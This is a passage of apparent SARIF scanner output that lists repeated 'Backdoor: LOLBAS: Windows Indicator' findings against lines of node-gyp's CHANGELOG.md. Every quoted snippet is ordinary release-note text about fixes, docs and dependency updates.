                    "text": "### Bug Fixes\n\n* _ in npm_config_ env variables ([eef4eef](https://www.github.com/nodejs/node-gyp/commit/eef4eefccb13ff6a32db862709ee5b2d4edf7e95))\n* update make-fetch-happen to a minimum of 10.0.3 ([839e414](https://www.github.com/nodejs/node-gyp/commit/839e414b63790c815a4a370d0feee8f24a94d40f))\n\n\n### Miscellaneous\n",
                    "rendered": {
                      "text": "### Bug Fixes\n\n* _ in npm_config_ env variables ([eef4eef](https://www.github.com/nodejs/node-gyp/commit/eef4eefccb13ff6a32db862709ee5b2d4edf7e95))\n* update make-fetch-happen to a minimum of 10.0.3 ([839e414](https://www.github.com/nodejs/node-gyp/commit/839e414b63790c815a4a370d0feee8f24a94d40f))\n\n\n### Miscellaneous\n",
                      "markdown": "`### Bug Fixes\n\n* _ in npm_config_ env variables ([eef4eef](https://www.github.com/nodejs/node-gyp/commit/eef4eefccb13ff6a32db862709ee5b2d4edf7e95))\n* update make-fetch-happen to a minimum of 10.0.3 ([839e414](https://www.github.com/nodejs/node-gyp/commit/839e414b63790c815a4a370d0feee8f24a94d40f))\n\n\n### Miscellaneous\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 235,
                  "startColumn": 1,
                  "endLine": 235,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\n### Core\n\n* update due to rename of primary branch ([ca1f068](https://www.github.com/nodejs/node-gyp/commit/ca1f0681a5567ca8cd51acebccd37a633f19bc6a))\n* Add Python symlink to path (for non-Windows OSes only) ([#2362](https://github.com/nodejs/node-gyp/pull/2362)) ([b9ddcd5](https://github.com/nodejs/node-gyp/commit/b9ddcd5bbd93b05b03674836b6ebdae2c2e74c8c))\n\n\n",
                    "rendered": {
                      "text": "\n### Core\n\n* update due to rename of primary branch ([ca1f068](https://www.github.com/nodejs/node-gyp/commit/ca1f0681a5567ca8cd51acebccd37a633f19bc6a))\n* Add Python symlink to path (for non-Windows OSes only) ([#2362](https://github.com/nodejs/node-gyp/pull/2362)) ([b9ddcd5](https://github.com/nodejs/node-gyp/commit/b9ddcd5bbd93b05b03674836b6ebdae2c2e74c8c))\n\n\n",
                      "markdown": "`\n### Core\n\n* update due to rename of primary branch ([ca1f068](https://www.github.com/nodejs/node-gyp/commit/ca1f0681a5567ca8cd51acebccd37a633f19bc6a))\n* Add Python symlink to path (for non-Windows OSes only) ([#2362](https://github.com/nodejs/node-gyp/pull/2362)) ([b9ddcd5](https://github.com/nodejs/node-gyp/commit/b9ddcd5bbd93b05b03674836b6ebdae2c2e74c8c))\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 230,
                  "startColumn": 1,
                  "endLine": 230,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\n### Doc\n\n* update docs/README.md with latest version number ([62d2815](https://www.github.com/nodejs/node-gyp/commit/62d28151bf8266a34e1bcceeb25b4e6e2ae5ca5d))\n\n\n### Core\n",
                    "rendered": {
                      "text": "\n### Doc\n\n* update docs/README.md with latest version number ([62d2815](https://www.github.com/nodejs/node-gyp/commit/62d28151bf8266a34e1bcceeb25b4e6e2ae5ca5d))\n\n\n### Core\n",
                      "markdown": "`\n### Doc\n\n* update docs/README.md with latest version number ([62d2815](https://www.github.com/nodejs/node-gyp/commit/62d28151bf8266a34e1bcceeb25b4e6e2ae5ca5d))\n\n\n### Core\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 217,
                  "startColumn": 1,
                  "endLine": 217,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\n### Features\n\n* Update function getSDK() to support Windows 11 SDK ([#2565](https://www.github.com/nodejs/node-gyp/issues/2565)) ([ea8520e](https://www.github.com/nodejs/node-gyp/commit/ea8520e3855374bd15b6d001fe112d58a8d7d737))\n\n\n### Bug Fixes\n",
                    "rendered": {
                      "text": "\n### Features\n\n* Update function getSDK() to support Windows 11 SDK ([#2565](https://www.github.com/nodejs/node-gyp/issues/2565)) ([ea8520e](https://www.github.com/nodejs/node-gyp/commit/ea8520e3855374bd15b6d001fe112d58a8d7d737))\n\n\n### Bug Fixes\n",
                      "markdown": "`\n### Features\n\n* Update function getSDK() to support Windows 11 SDK ([#2565](https://www.github.com/nodejs/node-gyp/issues/2565)) ([ea8520e](https://www.github.com/nodejs/node-gyp/commit/ea8520e3855374bd15b6d001fe112d58a8d7d737))\n\n\n### Bug Fixes\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 210,
                  "startColumn": 1,
                  "endLine": 210,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\n### Miscellaneous\n\n* update dependency - nopt@6.0.0 ([#2707](https://www.github.com/nodejs/node-gyp/issues/2707)) ([8958ecf](https://www.github.com/nodejs/node-gyp/commit/8958ecf2bb719227bbcbf155891c3186ee219a2e))\n\n## [9.1.0](https://www.github.com/nodejs/node-gyp/compare/v9.0.0...v9.1.0) (2022-07-13)\n\n",
                    "rendered": {
                      "text": "\n### Miscellaneous\n\n* update dependency - nopt@6.0.0 ([#2707](https://www.github.com/nodejs/node-gyp/issues/2707)) ([8958ecf](https://www.github.com/nodejs/node-gyp/commit/8958ecf2bb719227bbcbf155891c3186ee219a2e))\n\n## [9.1.0](https://www.github.com/nodejs/node-gyp/compare/v9.0.0...v9.1.0) (2022-07-13)\n\n",
                      "markdown": "`\n### Miscellaneous\n\n* update dependency - nopt@6.0.0 ([#2707](https://www.github.com/nodejs/node-gyp/issues/2707)) ([8958ecf](https://www.github.com/nodejs/node-gyp/commit/8958ecf2bb719227bbcbf155891c3186ee219a2e))\n\n## [9.1.0](https://www.github.com/nodejs/node-gyp/compare/v9.0.0...v9.1.0) (2022-07-13)\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 195,
                  "startColumn": 10,
                  "endLine": 195,
                  "endColumn": 18,
                  "snippet": {
                    "text": "### Features\n\n* Add proper support for IBM i ([a26494f](https://www.github.com/nodejs/node-gyp/commit/a26494fbb8883d9ef784503979e115dec3e2791e))\n* **gyp:** update gyp to v0.13.0 ([3e2a532](https://www.github.com/nodejs/node-gyp/commit/3e2a5324f1c24f3a04bca04cf54fe23d5c4d5e50))\n\n\n### Bug Fixes\n",
                    "rendered": {
                      "text": "### Features\n\n* Add proper support for IBM i ([a26494f](https://www.github.com/nodejs/node-gyp/commit/a26494fbb8883d9ef784503979e115dec3e2791e))\n* **gyp:** update gyp to v0.13.0 ([3e2a532](https://www.github.com/nodejs/node-gyp/commit/3e2a5324f1c24f3a04bca04cf54fe23d5c4d5e50))\n\n\n### Bug Fixes\n",
                      "markdown": "`### Features\n\n* Add proper support for IBM i ([a26494f](https://www.github.com/nodejs/node-gyp/commit/a26494fbb8883d9ef784503979e115dec3e2791e))\n* **gyp:** update gyp to v0.13.0 ([3e2a532](https://www.github.com/nodejs/node-gyp/commit/3e2a5324f1c24f3a04bca04cf54fe23d5c4d5e50))\n\n\n### Bug Fixes\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 185,
                  "startColumn": 10,
                  "endLine": 185,
                  "endColumn": 18,
                  "snippet": {
                    "text": "ate python test matrix ([#2774](https://www.github.com/nodejs/node-gyp/issues/2774)) ([38f01fa](https://www.github.com/nodejs/node-gyp/commit/38f01fa57d10fdb3db7697121d957bc2e0e96508))\n\n## [9.3.0](https://www.github.com/nodejs/node-gyp/compare/v9.2.0...v9.3.0) (2022-10-10)\n\n\n### Features\n\n* **gyp:** update gyp to v0.14.0 ([#2749](https://www.github.com/nodejs/node-gyp/issues/2749)) ([713b8dc](https://www.github.com/nodejs/node-gyp/commit/713b8dcdbf44532ca9453a127da266386cc737f8))\n* remove support for VS2015 in Node.js >=19 ([#2746](https://www.github.com/nodejs/node-gyp/issues/2746)) ([131d1a4](https:",
                    "rendered": {
                      "text": "ate python test matrix ([#2774](https://www.github.com/nodejs/node-gyp/issues/2774)) ([38f01fa](https://www.github.com/nodejs/node-gyp/commit/38f01fa57d10fdb3db7697121d957bc2e0e96508))\n\n## [9.3.0](https://www.github.com/nodejs/node-gyp/compare/v9.2.0...v9.3.0) (2022-10-10)\n\n\n### Features\n\n* **gyp:** update gyp to v0.14.0 ([#2749](https://www.github.com/nodejs/node-gyp/issues/2749)) ([713b8dc](https://www.github.com/nodejs/node-gyp/commit/713b8dcdbf44532ca9453a127da266386cc737f8))\n* remove support for VS2015 in Node.js >=19 ([#2746](https://www.github.com/nodejs/node-gyp/issues/2746)) ([131d1a4](https:",
                      "markdown": "`ate python test matrix ([#2774](https://www.github.com/nodejs/node-gyp/issues/2774)) ([38f01fa](https://www.github.com/nodejs/node-gyp/commit/38f01fa57d10fdb3db7697121d957bc2e0e96508))\n\n## [9.3.0](https://www.github.com/nodejs/node-gyp/compare/v9.2.0...v9.3.0) (2022-10-10)\n\n\n### Features\n\n* **gyp:** update gyp to v0.14.0 ([#2749](https://www.github.com/nodejs/node-gyp/issues/2749)) ([713b8dc](https://www.github.com/nodejs/node-gyp/commit/713b8dcdbf44532ca9453a127da266386cc737f8))\n* remove support for VS2015 in Node.js >=19 ([#2746](https://www.github.com/nodejs/node-gyp/issues/2746)) ([131d1a4](https:`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 178,
                  "startColumn": 1,
                  "endLine": 178,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\n### Miscellaneous\n\n* update python test matrix ([#2774](https://www.github.com/nodejs/node-gyp/issues/2774)) ([38f01fa](https://www.github.com/nodejs/node-gyp/commit/38f01fa57d10fdb3db7697121d957bc2e0e96508))\n\n## [9.3.0](https://www.github.com/nodejs/node-gyp/compare/v9.2.0...v9.3.0) (2022-10-10)\n\n",
                    "rendered": {
                      "text": "\n### Miscellaneous\n\n* update python test matrix ([#2774](https://www.github.com/nodejs/node-gyp/issues/2774)) ([38f01fa](https://www.github.com/nodejs/node-gyp/commit/38f01fa57d10fdb3db7697121d957bc2e0e96508))\n\n## [9.3.0](https://www.github.com/nodejs/node-gyp/compare/v9.2.0...v9.3.0) (2022-10-10)\n\n",
                      "markdown": "`\n### Miscellaneous\n\n* update python test matrix ([#2774](https://www.github.com/nodejs/node-gyp/issues/2774)) ([38f01fa](https://www.github.com/nodejs/node-gyp/commit/38f01fa57d10fdb3db7697121d957bc2e0e96508))\n\n## [9.3.0](https://www.github.com/nodejs/node-gyp/compare/v9.2.0...v9.3.0) (2022-10-10)\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 161,
                  "startColumn": 1,
                  "endLine": 161,
                  "endColumn": 9,
                  "snippet": {
                    "text": "### Doc\n\n* docs/README.md add advise about deprecated node-sass ([#2828](https://www.github.com/nodejs/node-gyp/issues/2828)) ([6f3c2d3](https://www.github.com/nodejs/node-gyp/commit/6f3c2d3c6c0de0dbf8c7245f34c2e0b3eea53812))\n* Update README.md ([#2822](https://www.github.com/nodejs/node-gyp/issues/2822)) ([c7927e2](https://www.github.com/nodejs/node-gyp/commit/c7927e228dfde059c93e08c26b54dd8026144583))\n\n\n### Tests\n",
                    "rendered": {
                      "text": "### Doc\n\n* docs/README.md add advise about deprecated node-sass ([#2828](https://www.github.com/nodejs/node-gyp/issues/2828)) ([6f3c2d3](https://www.github.com/nodejs/node-gyp/commit/6f3c2d3c6c0de0dbf8c7245f34c2e0b3eea53812))\n* Update README.md ([#2822](https://www.github.com/nodejs/node-gyp/issues/2822)) ([c7927e2](https://www.github.com/nodejs/node-gyp/commit/c7927e228dfde059c93e08c26b54dd8026144583))\n\n\n### Tests\n",
                      "markdown": "`### Doc\n\n* docs/README.md add advise about deprecated node-sass ([#2828](https://www.github.com/nodejs/node-gyp/issues/2828)) ([6f3c2d3](https://www.github.com/nodejs/node-gyp/commit/6f3c2d3c6c0de0dbf8c7245f34c2e0b3eea53812))\n* Update README.md ([#2822](https://www.github.com/nodejs/node-gyp/issues/2822)) ([c7927e2](https://www.github.com/nodejs/node-gyp/commit/c7927e228dfde059c93e08c26b54dd8026144583))\n\n\n### Tests\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 115,
                  "startColumn": 1,
                  "endLine": 115,
                  "endColumn": 9,
                  "snippet": {
                    "text": "://www.github.com/nodejs/node-gyp/commit/bb93b946a9c74934b59164deb52128cf913c97d5))\n* update applicable GitHub links from master to main ([#2843](https://www.github.com/nodejs/node-gyp/issues/2843)) ([d644ce4](https://www.github.com/nodejs/node-gyp/commit/d644ce48311edf090d0e920ad449e5766c757933))\n* Update windows installation instructions in README.md ([#2882](https://www.github.com/nodejs/node-gyp/issues/2882)) ([c9caa2e](https://www.github.com/nodejs/node-gyp/commit/c9caa2ecf3c7deae68444ce8fabb32d2dca651cd))\n\n\n### Core\n\n* find python checks order changed on windows ([#2872](https://www.github.com/n",
                    "rendered": {
                      "text": "://www.github.com/nodejs/node-gyp/commit/bb93b946a9c74934b59164deb52128cf913c97d5))\n* update applicable GitHub links from master to main ([#2843](https://www.github.com/nodejs/node-gyp/issues/2843)) ([d644ce4](https://www.github.com/nodejs/node-gyp/commit/d644ce48311edf090d0e920ad449e5766c757933))\n* Update windows installation instructions in README.md ([#2882](https://www.github.com/nodejs/node-gyp/issues/2882)) ([c9caa2e](https://www.github.com/nodejs/node-gyp/commit/c9caa2ecf3c7deae68444ce8fabb32d2dca651cd))\n\n\n### Core\n\n* find python checks order changed on windows ([#2872](https://www.github.com/n",
                      "markdown": "`://www.github.com/nodejs/node-gyp/commit/bb93b946a9c74934b59164deb52128cf913c97d5))\n* update applicable GitHub links from master to main ([#2843](https://www.github.com/nodejs/node-gyp/issues/2843)) ([d644ce4](https://www.github.com/nodejs/node-gyp/commit/d644ce48311edf090d0e920ad449e5766c757933))\n* Update windows installation instructions in README.md ([#2882](https://www.github.com/nodejs/node-gyp/issues/2882)) ([c9caa2e](https://www.github.com/nodejs/node-gyp/commit/c9caa2ecf3c7deae68444ce8fabb32d2dca651cd))\n\n\n### Core\n\n* find python checks order changed on windows ([#2872](https://www.github.com/n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 114,
                  "startColumn": 1,
                  "endLine": 114,
                  "endColumn": 9,
                  "snippet": {
                    "text": "ithub.com/nodejs/node-gyp/commit/b3d41aeb737ddd54cc292f363abc561dcc0a614e))\n* README.md Do not hardcode the supported versions of Python ([#2880](https://www.github.com/nodejs/node-gyp/issues/2880)) ([bb93b94](https://www.github.com/nodejs/node-gyp/commit/bb93b946a9c74934b59164deb52128cf913c97d5))\n* update applicable GitHub links from master to main ([#2843](https://www.github.com/nodejs/node-gyp/issues/2843)) ([d644ce4](https://www.github.com/nodejs/node-gyp/commit/d644ce48311edf090d0e920ad449e5766c757933))\n* Update windows installation instructions in README.md ([#2882](https://www.github.com/nodejs",
                    "rendered": {
                      "text": "ithub.com/nodejs/node-gyp/commit/b3d41aeb737ddd54cc292f363abc561dcc0a614e))\n* README.md Do not hardcode the supported versions of Python ([#2880](https://www.github.com/nodejs/node-gyp/issues/2880)) ([bb93b94](https://www.github.com/nodejs/node-gyp/commit/bb93b946a9c74934b59164deb52128cf913c97d5))\n* update applicable GitHub links from master to main ([#2843](https://www.github.com/nodejs/node-gyp/issues/2843)) ([d644ce4](https://www.github.com/nodejs/node-gyp/commit/d644ce48311edf090d0e920ad449e5766c757933))\n* Update windows installation instructions in README.md ([#2882](https://www.github.com/nodejs",
                      "markdown": "`ithub.com/nodejs/node-gyp/commit/b3d41aeb737ddd54cc292f363abc561dcc0a614e))\n* README.md Do not hardcode the supported versions of Python ([#2880](https://www.github.com/nodejs/node-gyp/issues/2880)) ([bb93b94](https://www.github.com/nodejs/node-gyp/commit/bb93b946a9c74934b59164deb52128cf913c97d5))\n* update applicable GitHub links from master to main ([#2843](https://www.github.com/nodejs/node-gyp/issues/2843)) ([d644ce4](https://www.github.com/nodejs/node-gyp/commit/d644ce48311edf090d0e920ad449e5766c757933))\n* Update windows installation instructions in README.md ([#2882](https://www.github.com/nodejs`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 107,
                  "startColumn": 1,
                  "endLine": 107,
                  "endColumn": 9,
                  "snippet": {
                    "text": "### Tests\n\n* increase mocha timeout ([#2887](https://www.github.com/nodejs/node-gyp/issues/2887)) ([445c28f](https://www.github.com/nodejs/node-gyp/commit/445c28fabc5fbdf9c3bb3341fb70660a3530f6ad))\n* update expired certs ([#2908](https://www.github.com/nodejs/node-gyp/issues/2908)) ([5746691](https://www.github.com/nodejs/node-gyp/commit/5746691a36f7b37019d4b8d4e9616aec43d20410))\n\n\n### Doc\n",
                    "rendered": {
                      "text": "### Tests\n\n* increase mocha timeout ([#2887](https://www.github.com/nodejs/node-gyp/issues/2887)) ([445c28f](https://www.github.com/nodejs/node-gyp/commit/445c28fabc5fbdf9c3bb3341fb70660a3530f6ad))\n* update expired certs ([#2908](https://www.github.com/nodejs/node-gyp/issues/2908)) ([5746691](https://www.github.com/nodejs/node-gyp/commit/5746691a36f7b37019d4b8d4e9616aec43d20410))\n\n\n### Doc\n",
                      "markdown": "`### Tests\n\n* increase mocha timeout ([#2887](https://www.github.com/nodejs/node-gyp/issues/2887)) ([445c28f](https://www.github.com/nodejs/node-gyp/commit/445c28fabc5fbdf9c3bb3341fb70660a3530f6ad))\n* update expired certs ([#2908](https://www.github.com/nodejs/node-gyp/issues/2908)) ([5746691](https://www.github.com/nodejs/node-gyp/commit/5746691a36f7b37019d4b8d4e9616aec43d20410))\n\n\n### Doc\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 93,
                  "startColumn": 1,
                  "endLine": 93,
                  "endColumn": 9,
                  "snippet": {
                    "text": ".16.1 ([#2923](https://www.github.com/nodejs/node-gyp/issues/2923)) ([707927c](https://www.github.com/nodejs/node-gyp/commit/707927cd579205ef2b4b17e61c1cce24c056b452))\n* replace npmlog with proc-log ([4a50fe3](https://www.github.com/nodejs/node-gyp/commit/4a50fe31574217c4b2a798fc72b19947a64ceea1))\n* update engines.node to ^14.17.0 || ^16.13.0 || >=18.0.0 ([4a50fe3](https://www.github.com/nodejs/node-gyp/commit/4a50fe31574217c4b2a798fc72b19947a64ceea1))\n* use .npmignore file to limit which files are published ([#2921](https://www.github.com/nodejs/node-gyp/issues/2921)) ([864a979](https://www.github.co",
                    "rendered": {
                      "text": ".16.1 ([#2923](https://www.github.com/nodejs/node-gyp/issues/2923)) ([707927c](https://www.github.com/nodejs/node-gyp/commit/707927cd579205ef2b4b17e61c1cce24c056b452))\n* replace npmlog with proc-log ([4a50fe3](https://www.github.com/nodejs/node-gyp/commit/4a50fe31574217c4b2a798fc72b19947a64ceea1))\n* update engines.node to ^14.17.0 || ^16.13.0 || >=18.0.0 ([4a50fe3](https://www.github.com/nodejs/node-gyp/commit/4a50fe31574217c4b2a798fc72b19947a64ceea1))\n* use .npmignore file to limit which files are published ([#2921](https://www.github.com/nodejs/node-gyp/issues/2921)) ([864a979](https://www.github.co",
                      "markdown": "`.16.1 ([#2923](https://www.github.com/nodejs/node-gyp/issues/2923)) ([707927c](https://www.github.com/nodejs/node-gyp/commit/707927cd579205ef2b4b17e61c1cce24c056b452))\n* replace npmlog with proc-log ([4a50fe3](https://www.github.com/nodejs/node-gyp/commit/4a50fe31574217c4b2a798fc72b19947a64ceea1))\n* update engines.node to ^14.17.0 || ^16.13.0 || >=18.0.0 ([4a50fe3](https://www.github.com/nodejs/node-gyp/commit/4a50fe31574217c4b2a798fc72b19947a64ceea1))\n* use .npmignore file to limit which files are published ([#2921](https://www.github.com/nodejs/node-gyp/issues/2921)) ([864a979](https://www.github.co`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 91,
                  "startColumn": 10,
                  "endLine": 91,
                  "endColumn": 18,
                  "snippet": {
                    "text": "rt ([#2929](https://www.github.com/nodejs/node-gyp/issues/2929)) ([1b3bd34](https://www.github.com/nodejs/node-gyp/commit/1b3bd341b40f384988d03207ce8187e93ba609bc))\n* drop rimraf dependency ([4a50fe3](https://www.github.com/nodejs/node-gyp/commit/4a50fe31574217c4b2a798fc72b19947a64ceea1))\n* **gyp:** update gyp to v0.16.1 ([#2923](https://www.github.com/nodejs/node-gyp/issues/2923)) ([707927c](https://www.github.com/nodejs/node-gyp/commit/707927cd579205ef2b4b17e61c1cce24c056b452))\n* replace npmlog with proc-log ([4a50fe3](https://www.github.com/nodejs/node-gyp/commit/4a50fe31574217c4b2a798fc72b19947a64",
                    "rendered": {
                      "text": "rt ([#2929](https://www.github.com/nodejs/node-gyp/issues/2929)) ([1b3bd34](https://www.github.com/nodejs/node-gyp/commit/1b3bd341b40f384988d03207ce8187e93ba609bc))\n* drop rimraf dependency ([4a50fe3](https://www.github.com/nodejs/node-gyp/commit/4a50fe31574217c4b2a798fc72b19947a64ceea1))\n* **gyp:** update gyp to v0.16.1 ([#2923](https://www.github.com/nodejs/node-gyp/issues/2923)) ([707927c](https://www.github.com/nodejs/node-gyp/commit/707927cd579205ef2b4b17e61c1cce24c056b452))\n* replace npmlog with proc-log ([4a50fe3](https://www.github.com/nodejs/node-gyp/commit/4a50fe31574217c4b2a798fc72b19947a64",
                      "markdown": "`rt ([#2929](https://www.github.com/nodejs/node-gyp/issues/2929)) ([1b3bd34](https://www.github.com/nodejs/node-gyp/commit/1b3bd341b40f384988d03207ce8187e93ba609bc))\n* drop rimraf dependency ([4a50fe3](https://www.github.com/nodejs/node-gyp/commit/4a50fe31574217c4b2a798fc72b19947a64ceea1))\n* **gyp:** update gyp to v0.16.1 ([#2923](https://www.github.com/nodejs/node-gyp/issues/2923)) ([707927c](https://www.github.com/nodejs/node-gyp/commit/707927cd579205ef2b4b17e61c1cce24c056b452))\n* replace npmlog with proc-log ([4a50fe3](https://www.github.com/nodejs/node-gyp/commit/4a50fe31574217c4b2a798fc72b19947a64`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 53,
                  "startColumn": 17,
                  "endLine": 53,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n* npm is currently v10 ([#2970](https://github.com/nodejs/node-gyp/issues/2970)) ([7705a22](https://github.com/nodejs/node-gyp/commit/7705a22f31a62076e9f8429780a459f4ad71ea4c))\n* remove outdated Node versions from readme ([#2955](https://github.com/nodejs/node-gyp/issues/2955)) ([ae8478e](https://github.com/nodejs/node-gyp/commit/ae8478ec32d9b2fa71b591ac22cdf867ef2e9a7d))\n* remove outdated update engines.node reference in 10.0.0 changelog ([b42e796](https://github.com/nodejs/node-gyp/commit/b42e7966177f006f3d1aab1d27885d8372c8ed01))\n\n\n### Miscellaneous\n",
                    "rendered": {
                      "text": "\n* npm is currently v10 ([#2970](https://github.com/nodejs/node-gyp/issues/2970)) ([7705a22](https://github.com/nodejs/node-gyp/commit/7705a22f31a62076e9f8429780a459f4ad71ea4c))\n* remove outdated Node versions from readme ([#2955](https://github.com/nodejs/node-gyp/issues/2955)) ([ae8478e](https://github.com/nodejs/node-gyp/commit/ae8478ec32d9b2fa71b591ac22cdf867ef2e9a7d))\n* remove outdated update engines.node reference in 10.0.0 changelog ([b42e796](https://github.com/nodejs/node-gyp/commit/b42e7966177f006f3d1aab1d27885d8372c8ed01))\n\n\n### Miscellaneous\n",
